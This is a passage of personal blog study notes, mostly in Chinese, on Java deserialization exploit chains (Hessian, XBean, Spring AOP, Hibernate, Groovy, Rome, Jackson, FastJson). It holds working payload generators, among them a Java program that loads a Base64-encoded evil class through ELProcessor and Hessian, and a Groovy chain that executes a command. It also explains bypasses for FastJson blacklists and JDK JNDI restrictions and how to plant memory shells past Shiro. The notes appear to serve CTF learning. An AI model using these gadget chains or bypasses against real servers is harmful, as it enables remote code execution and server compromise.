XString.equals() (com.sun.org.apache.xpath.internal.objects)
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()
#### XBean链
NamingManager.getObjectFactoryFromReference() (javax.naming.spi)
NamingManager.getObjectInstance() (javax.naming.spi)
ContextUtil.resolve()   (org.apache.xbean.naming.context)// 关键点
ContextUtil$ReadOnlyBinding.getObject() (org.apache.xbean.naming.context)// 关键点
Binding.toString() (com.caucho.naming)     // 关键点
XString.equals() (com.sun.org.apache.xpath.internal.objects)
HotSwappableTargetSource.equals()
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()

### AspectJPointcutAdvisor
//反序列化时AspectJPointcutAdvisor.der会被调用，会触发AspectJAroundAdvice.getOrder
getOrder会被调用，会触发AspectJAroundAdvice.getOrder

### AspectJAroundAdvice
//反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BeanFactoryAspectInstanceFactory.getOrder</span><br><span class="line">        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        Reflections.setFieldValue(aif, &quot;beanFactory&quot;, bf);</span><br><span class="line">        Reflections.setFieldValue(aif, &quot;name&quot;, jndiUrl);</span><br></pre></td></tr></table></figure>


### SimpleJndiBeanFactory -&gt;lookup 前AspectJAroundAdvice
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String jndiUrl = &quot;ldap://localhost:1389/obj&quot;;</span><br><span class="line">      	 SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();</span><br><span class="line">      	 bf.setShareableResources(jndiUrl);</span><br><span class="line">       Reflections.setFieldValue(bf, &quot;logger&quot;, new NoOpLog());</span><br><span class="line">       Reflections.setFieldValue(bf.getJndiTemplate(), &quot;logger&quot;, new NoOpLog());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
### SpringPartiallyComparableAdvisorHolder链
借助AOP依赖  Hessian提供入口

### SpringAbstractBeanFactoryPointcutAdvisor -》SimpleJndiBeanFactory-》lookup


### ResouceRef+ELProccessor RCE
可不可以直接动态执行指令 不是类加载式的rce
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">public class ELProcessChain &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\CTFLearning\\Java\\ResinChain\\target\\classes\\com\\example\\resinchain\\evil.class&quot;));</span><br><span class="line">        String s1 = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        String x = &quot;var str=&#x27;&quot;+s1+&quot;&#x27;;var Thread = Java.type(&#x27;java.lang.Thread&#x27;);var tt=Thread.currentThread().getContextClassLoader();var b64 = Java.type(&#x27;sun.misc.BASE64Decoder&#x27;);var b=new b64().decodeBuffer(str);var byteArray = Java.type(&#x27;byte[]&#x27;);var int = Java.type(&#x27;int&#x27;);var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&#x27;defineClass&#x27;,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc = defineClassMethod.invoke(tt,b,0,b.length);cc.newInstance();&quot;;</span><br><span class="line">        //String x = &quot;java.lang.Runtime.getRuntime().exec(\\\&quot;calc\\\&quot;)&quot;;</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;pupi1=eval&quot;));</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;pupi1&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;js\&quot;).eval(\&quot;&quot;+ x +&quot;\&quot;)&quot;));</span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(&quot;javax.naming.spi.ContinuationDirContext&quot;); //$NON-NLS-1$</span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ccCons.setAccessible(true);</span><br><span class="line">        CannotProceedException cpe = new CannotProceedException();</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(resourceRef);</span><br><span class="line">        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable&lt;&gt;());</span><br><span class="line"></span><br><span class="line">//       jdk.nashorn.internal.objects.NativeString str = new jdk.nashorn.internal.objects.NativeString();</span><br><span class="line">        JSONObject jsonObject = new JSONObject();</span><br><span class="line">        jsonObject.put(&quot;boogipop&quot;,ctx);</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output out = new Hessian2Output(baos);</span><br><span class="line">        baos.write(67);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        out.writeObject(jsonObject);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        Hessian2Input input = new Hessian2Input(bais);</span><br><span class="line">        input.readObject();</span><br><span class="line">        //String ret = Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        //System.out.println(ret);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();</span><br><span class="line">        setFieldValue(s, &quot;size&quot;, 2);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        try &#123;</span><br><span class="line">            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));</span><br><span class="line">        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));</span><br><span class="line">        setFieldValue(s, &quot;table&quot;, tbl);</span><br><span class="line">        return s;</span><br><span class="line">    &#125;</span><br><span class="line">    public static &lt;T&gt; T createWithoutConstructor(Class&lt;T&gt; classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String serial(Object o) throws IOException, NoSuchFieldException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span><br><span class="line">        //writeReplaceMethod.setAccessible(true);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        return base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static &lt;T&gt; T createWithConstructor(Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? super T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(true);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(true);</span><br><span class="line">        return (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String unhash ( int hash ) &#123;</span><br><span class="line">        int target = hash;</span><br><span class="line">        StringBuilder answer = new StringBuilder();</span><br><span class="line">        if ( target &lt; 0 ) &#123;</span><br><span class="line">            // String with hash of Integer.MIN_VALUE, 0x80000000</span><br><span class="line">            answer.append(&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;);</span><br><span class="line"></span><br><span class="line">            if ( target == Integer.MIN_VALUE )</span><br><span class="line">                return answer.toString();</span><br><span class="line">            // Find target without sign bit set</span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        return answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    private static void unhash0 ( StringBuilder partial, int target ) &#123;</span><br><span class="line">        int div = target / 31;</span><br><span class="line">        int rem = target % 31;</span><br><span class="line"></span><br><span class="line">        if ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            if ( div != 0 )</span><br><span class="line">                partial.append((char) div);</span><br><span class="line">            partial.append((char) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((char) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

用的仍然是BeanFactory那一套eval组合拳
进入入口getObjectFactoryFromReference
实例化BeanFactory返回
调用BeanFactory的getObjectInstance函数
反射RCE
### Hibernate1
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">		            PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                TemplatesImpl.getOutputProperties()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">                    PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                JdbcRowSetImpl.getDatabaseMetaData()</span><br></pre></td></tr></table></figure>
### spring
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</span><br><span class="line">    SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">	    AnnotationInvocationHandler.invoke()</span><br><span class="line">		    ReflectionUtils.invokeMethod()</span><br><span class="line">			    Templates(Proxy).newTransformer()</span><br><span class="line">				    AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">					    ObjectFactory(Proxy).getObject()</span><br><span class="line">						    TemplatesImpl.newTransformer()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</span><br><span class="line">    SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">	    AnnotationInvocationHandler.invoke()</span><br><span class="line">		    ReflectionUtils.invokeMethod()</span><br><span class="line">			    Templates(Proxy).newTransformer()</span><br><span class="line">				    JdkDynamicAopProxy.invoke()</span><br><span class="line">                        AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">						    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>
###  Groovy : 1.7.0-2.4.3


AnnotationInvocationHandler.readObject()
    Map.entrySet() (Proxy)
        ConversionHandler.invoke()
            ConvertedClosure.invokeCustom()
                MethodClosure.call()
                    ProcessGroovyMethods.execute()

AnnotationInvocationHandler 反序列化时调用 memberValues 中存放对象的 entrySet 对象，这个对象是 ConvertedClosure，而这个对象又实际上是 MethodClosure 对象的代理，定义了在调用 entrySet 方法时会调用 invoke 方法去调用 MethodClosure 的 call 方法，触发 Groovy 中 String 类型的 execute 方法执行命令
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Groovy &#123;</span><br><span class="line"></span><br><span class="line">	public static String fileName = &quot;Groovy.bin&quot;;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">		//封装我们需要执行的对象</span><br><span class="line">		MethodClosure    methodClosure = new MethodClosure(&quot;open -a Calculator.app&quot;, &quot;execute&quot;);</span><br><span class="line">		ConvertedClosure closure       = new ConvertedClosure(methodClosure, &quot;entrySet&quot;);</span><br><span class="line"></span><br><span class="line">		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];</span><br><span class="line">		constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">		// 创建 ConvertedClosure 的动态代理类实例</span><br><span class="line">		Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),</span><br><span class="line">				new Class[]&#123;Map.class&#125;, closure);</span><br><span class="line"></span><br><span class="line">		// 使用动态代理初始化 AnnotationInvocationHandler</span><br><span class="line">		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);</span><br><span class="line"></span><br><span class="line">		SerializeUtil.writeObjectToFile(invocationHandler, fileName);</span><br><span class="line">		SerializeUtil.readFileObject(fileName);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


# 学习笔记 
CommonsBeanutils 利用链中核心的触发位置就是 BeanComparator.compare() 函数，当调用 BeanComparator.compare() 函数时，其内部会调用我们前面说的 getProperty 函数，进而调用 JavaBean 中对应属性的 getter 函数

如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通 信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会 根据固定算法计算出一个当前类的serialVersionUID值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的serialVersionUID不同，则反序列化就会异常退出，避免后续的未知隐患。



异常信息 org.apache.shiro.io.ClassResolvingObjectInputStream，可以看到，这是一个 ObjectInputStream 的子类，其重写了 resolveClass 方法:resolveClass 是反序列化中用来查找类的方法，在读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来找到对应的 java.lang.Class 


TemplatesImpl的hashCode()是个Native()方法，每次运行都会改变，所以不可控。

Commons Collections提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。在compare不同对象时，经常用到CC 来转换类型。

寻找到某个带有危险方法的类，并且继承了序列化接口，然后再依次向上回溯，直到找到一个重写了readObject方法的类

构造器和方法都是protected权限的，也就是说只能本类内部访问，不能外部调用去实例化，那么我们就需要找到内部实例化的工具 比如public方法

1.8 8u71版本以后，对AnnotationInvocationHandler的readobject进行了改写。导致高版本中利用链无法使用。

shiro550中自带CommonsBeanutils 1.8.3 和 commons-collections-3.2.1的依赖

CC2链里面并不是使用 AnnotationInvocationHandler来构造，而是使用javassist和PriorityQueue来构造利用链。

3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口,也就是说这是不可以被序列化的。所以在利用链上就不能使用他去构造。

方法是private私有属性，我们不能直接调用，我们可以通过反射调用doCall

Set实际上相当于只存储key、不存储value的Map。我们经常用Set用于去除重复元素。因为对象不重复，因此就会涉及到比较。equals是用来比较两个对象的内容是否相同。动态代理时调用equals有意外的效果

shiro作用于中间件的filter环节，所以servlet内存马在访问阶段就被shiro干掉了，不能用。因此必须写入filter内存马，并将其放在shiro的filter前面，以便访问和利用；另外，也可以写入listener内存马，不需要操心filter顺序问题，但可能会影响服务器性能。

这些类包括：FastJson的JSONObject类、Jackson的POJONode类，ROME的ToStringBean类
目标类getter：TemplatesImpl#getOutputProperties、LdapAttribute#getAttributeDefinition、JdbcRowsetImpl#getDatabaseMetaData值得一提的是，由于是原生反序列化中的攻击，所以要求利用链上的类都要实现Serilizable接口，因此无法使用BCEL那条链（仅特殊反序列化如FastJson可用）Rome 的链核心是 ToStringBean会调用他封装类的全部无参 getter 方法


Runtime里看一下，发现它没有serializable接口，不能被序列化: 怎么办呢，我们这里可以运用反射来获取它的原型类，它的原型类class是存在serializable接口，可以序列化的  难怪CC1中需要反射形势把Runtime放进去

FastJson黑名单检查与绕过。了解过FastJson漏洞的师傅一定都知道它的checkAutoType方法，这是其核心防御机制，原本只在FastJson反序列化流程中被触发,然而到了1.2.49以后，JsonObject类中重写了readObject方法，在resolveClass中会对目标类进行checkAutoType检查，本文所述攻击方式会受影响
参考1ue师傅提出的绕过方法，给入口类对象和目标类对象套一层List、Set或Map，以BadAttributeValueExpException入口类为例，代码如下 从而使得序列化时，先给外层Map中的目标类对象建立引用映射，再在序列化JsonObject中的目标类对象时以引用类型写入目标类对象反序列化时，在恢复JsonObject中的目标类对象时，因为它是引用类型，所以不会走到resolveClass方法，实现绕过在外层Map中的时候就恢复过一次了，有缓存，所以第二次恢复就直接引用了推广一下这种绕过思路，当Gadget中的某个类在readObject里的resolveClass方法中添加了安全检查，我们只要能顺利通过入口的readObject方法，就可以将黑名单类对象转换为引用类型来绕过检测而当入口的readObject方法也做了黑名单检测之类的防御时，就需要结合二次反序列化进行绕（SignedObject、UnicastRef、JNDI.......）


Jackson getter调用顺序不稳定及解决方式。Jackson结合LDAPAttribute使用的时候不需要这部分操作，如果添加了反而会出错（当然)解决方式： https://xz.aliyun.com/t/12846 . 删除writeplace()方法这一块也早就有很多师傅提过，但因为是一个很小的点，并没有专门分析的文章，不太好直接扔链接，我也就干脆顺便提一下在Java对象的序列化流程中，如果其类（或父类）拥有writeReplace方（字面意思，writeObject 替代）就会走到类自己的序列化逻辑Jackson中的POJONode类就满足这个条件，在序列化的时候便会发生报错（Jackson序列化和Java原生序列化的数据自然是不同的）解决这个问题有多种思路，我们直接使用Javaassist字节码修改工具，删除BaseJsonNode类中的writeReplace方法即可
CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);
        CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();



Rome 1.12.0之前都可以用，注意1.0和后续版本中beanClass、obj的属性名有差别（低版本属性名前会有一个下划线 _ ）Rome结合TemplatesImpl利用时存在和Jackson相似的问题，可能会在调用别的getter时报错而提前终止流程这里也是采用相似的解决思路，使用Rome时可以直接在ToStringBean里指定从哪个类里获取getter，操作起来很简单

Object templatesImpl = null;
        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl); //在这里指定了从templates.class接口里去获取getter，
                                                                              //其中只有一个getter：getOutputProperties()
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class Bv = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;);
        Field val = Bv.getDeclaredField(&quot;val&quot;);
        val.setAccessible(true);
        val.set(badAttributeValueExpException,toStringBean);
        serialize(badAttributeValueExpException);       
        unserialize(&quot;ser.bin&quot;);
Rome链可以结合JdbcRowSetImpl使用，乍一看没什么大不了，但对getter调用流程有了解的师傅应该会意识到问题所在getter的调用是一个一个来的，如果中途报错，流程就会中断，让我们来看看JdbcRowSetImpl里的getter（property：仅A到D）这也是为什么FastJson和Jackson结合JdbcRowSetImpl的利用都是会中途报错的public static void main(String[] args) throws Exception&#123;
        JdbcRowSetImpl jdbcRowset = new JdbcRowSetImpl();
        String url = &quot;ldap://127.0.0.1:10990&quot;;
        jdbcRowset.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowset);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class Bv = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;);
        Field val = Bv.getDeclaredField(&quot;val&quot;);
        val.setAccessible(true);
        val.set(badAttributeValueExpException,toStringBean);

        serialize(badAttributeValueExpException);
        unserialize(&quot;ser.bin&quot;);
    &#125; 
总之就是在这个机缘巧合之下，getter存放顺序很合适，使得在调用到getDatabaseMetaData()之前都不会报错从而Rome链可以结合JdbcRowSetImpl使用！

目前为止没能发现别的思路，因此Rome链确实是不可以结合LdapAttribute使用的。Rome链在1.12.0之后的版本不可用了，修复主要集中在对于ToStringBean类的修改

无论是构造方法、getter/setter 方法、readObject 等等方法都不会在 Hessian 反序列化中被触发，那怎么会产生漏洞呢？答案就在 Hessian 对 Map 类型数据的处理上，在之前的分析中提到，MapDeserializer#readMap 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。Hessian不需要类实现serializable接口，有时候有奇效.默认使用的是HashMap如果制定了是SortedMap,将会创建TreeMap对象。

二次反序列化上面 Gadget 因为是 JNDI 需要出网，所以通常被认为限制很高，因此还需要找无需出网的利用方式。其中一个常见的方式是使用 java.security.SignedObject 进行二次反序列化。

sun.print.UnixPrintService 直接执行命令的方式，这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令。

原生类 UnixPrintService  前get()在unix下有用，rce  。这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令。可惜这个类在高版本被移除

ysomap支持Java原生反序列化利用链、fastjson利用链、hessian利用链、xmldecoder、xstream

存在一种EL表达式动态执行指令的方式，但是条件是tomcat的版本在9.x以下，选用8最为稳定。POC如下

对于JDK版本11.0.1、8u191、7u201、6u211及以上，RMI和LDAP的trustURLCodebase已经被限制，但是还存在几种方法绕过。绕过方法一用本地恶意 Class 作为 Reference Factory
简单地说，就是要服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用。该恶意 Factory 类必须实现javax.naming.spi.ObjectFactory接口，实现该接口的 getObjectInstance() 方法。绕过方法二 利用 LDAP 返回序列化数据，触发本地 Gadget

#### sun源码 
下载地址:https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4



点击左下角的zip即可下载，然后解压。再进入到相应JDK的文件夹中，里面本来就有个src.zip的压缩包，我们解压到当前文件夹下，然后把之前源码包(jdk-af660750b2f4.zip)中/src/share/classes下的sun文件夹拷贝到src文件夹中去。打开IDEA，选择文件 ---&gt;项目结构 ---&gt;SDK ---&gt;源路径 ---&gt;把src文件夹添加到源路径下，


保存即可。
</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Charger0</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
